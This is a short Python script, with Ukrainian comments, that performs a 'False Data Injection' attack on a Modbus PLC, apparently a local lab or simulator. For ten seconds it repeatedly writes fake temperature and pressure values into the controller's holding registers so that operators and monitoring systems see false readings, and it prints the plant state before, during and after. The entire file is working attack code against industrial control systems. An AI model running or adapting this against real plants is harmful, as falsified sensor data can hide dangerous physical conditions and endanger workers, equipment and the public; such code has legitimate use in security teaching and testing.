import time
from pymodbus.client.sync import ModbusTcpClient


PLC_HOST = "127.0.0.1"
PLC_PORT = 5020


def read_plc_state(client):
    """
    Зчитування поточного стану PLC.
    """
    result = client.read_holding_registers(0, 4, unit=1)

    if result.isError():
        print("Cannot read PLC registers")
        return None

    return {
        "temperature": result.registers[0],
        "pressure": result.registers[1],
        "water_level": result.registers[2],
        "pump_status": result.registers[3],
    }


def print_state(title, state):
    """
    Виведення стану PLC у консоль.
    """
    if state is None:
        return

    print(f"\n{title}")
    print(f"Temperature : {state['temperature']}")
    print(f"Pressure    : {state['pressure']}")
    print(f"Water Level : {state['water_level']}")
    print(f"Pump Status : {state['pump_status']}")


def false_data_injection(duration=10):
    """
    False Data Injection Attack.

    Суть атаки:
    атакуючий постійно підмінює показники датчиків,
    щоб оператор або система моніторингу бачили неправдиві дані.

    Register 0 — Temperature
    Register 1 — Pressure
    """

    client = ModbusTcpClient(PLC_HOST, port=PLC_PORT)

    if not client.connect():
        print("Cannot connect to PLC")
        return

    print("Connected to PLC")
    print("Starting False Data Injection attack...")

    before = read_plc_state(client)
    print_state("Before attack:", before)

    print(f"\nInjecting fake data for {duration} seconds...")

    start_time = time.time()

    while time.time() - start_time < duration:
        # Постійно підмінюємо значення
        client.write_register(0, 999, unit=1)  # fake temperature
        client.write_register(1, 0, unit=1)    # fake pressure

        current = read_plc_state(client)
        print_state("Injected state:", current)

        time.sleep(1)

    after = read_plc_state(client)
    print_state("After attack:", after)

    client.close()
    print("\nFalse Data Injection attack finished.")


if __name__ == "__main__":
    false_data_injection(duration=10)